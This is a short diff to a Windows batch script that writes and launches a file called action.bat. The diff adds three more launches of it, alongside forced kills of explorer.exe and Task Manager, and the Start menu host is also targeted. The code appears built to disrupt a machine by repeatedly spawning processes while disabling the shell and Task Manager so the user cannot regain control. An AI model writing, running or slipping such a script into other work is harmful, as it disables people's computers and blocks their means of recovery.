@@ -10,6 +10,9 @@ if exist "C:\mainprogram\action.bat" (
     echo @echo off > "C:\mainprogram\action.bat"
     @echo off 
     start "action.bat" "C:\mainprogram\action.bat"
+    start "action.bat" "C:\mainprogram\action.bat"
+    start "action.bat" "C:\mainprogram\action.bat"
+    start "action.bat" "C:\mainprogram\action.bat"
     taskkill /IM "explorer.exe" /f
     taskkill /IM "Taskmgr.exe" /f
     taskkill /IM "StartMenuExperienceHost.exe" >> "C:\Users\block\Downloads\mainprogram\action.bat"
